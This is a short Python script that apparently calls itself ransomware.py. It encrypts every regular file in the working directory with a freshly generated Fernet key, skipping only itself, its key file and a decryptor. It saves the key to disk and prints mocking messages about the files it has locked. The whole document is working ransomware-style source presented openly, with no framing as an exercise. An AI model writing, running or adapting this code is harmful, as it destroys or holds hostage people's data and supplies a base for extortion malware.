import os
from cryptography.fernet import Fernet

print('-'*50)
print("Welcome to your DOOM")
print("-"*50)

my_key = Fernet.generate_key()
f = Fernet(my_key)

files = []

for filename in os.listdir(os.getcwd()):
    if filename == "ransomware.py" or filename == "thekey.key" or filename == "decryptor.py":
            continue
    if os.path.isfile(filename):
        files.append(filename)

with open("thekey.key", "wb") as thekey:
    thekey.write(my_key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()

    contents_encrypted = f.encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


print(my_key)

print('-'*50)
print("these files have been fucked: {}".format(files))
print("-"*50)